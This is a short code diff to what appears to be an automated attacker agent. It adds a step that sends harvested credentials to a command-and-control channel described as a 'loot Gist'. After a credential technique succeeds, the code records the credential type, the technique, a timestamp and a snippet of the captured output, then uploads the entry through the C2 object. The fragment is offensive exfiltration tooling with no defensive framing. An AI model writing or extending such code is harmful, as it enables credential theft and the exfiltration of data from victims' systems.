@@ -56,6 +56,19 @@ def eval_node(state: "AttackerState") -> "AttackerState":
                     "cred_type": cred_type,
                     "technique": technique,
                 })
+                # Write to loot Gist if C2 available
+                c2 = state.get("c2")
+                if c2 and hasattr(c2, "append_loot"):
+                    import time as _t
+                    entry = f"\n## {cred_type} — via {technique} — {_t.strftime('%Y-%m-%dT%H:%M:%SZ', _t.gmtime())}\n"
+                    # Extract relevant snippet from output (first 800 chars around the indicator)
+                    for ind in indicators:
+                        idx = output.find(ind)
+                        if idx >= 0:
+                            snippet = output[max(0, idx-50):idx+400]
+                            entry += f"```\n{snippet}\n```\n"
+                            break
+                    c2.append_loot(entry)
 
     # Remove failed technique from available vectors
     if rc != 0 and technique in available_vectors:
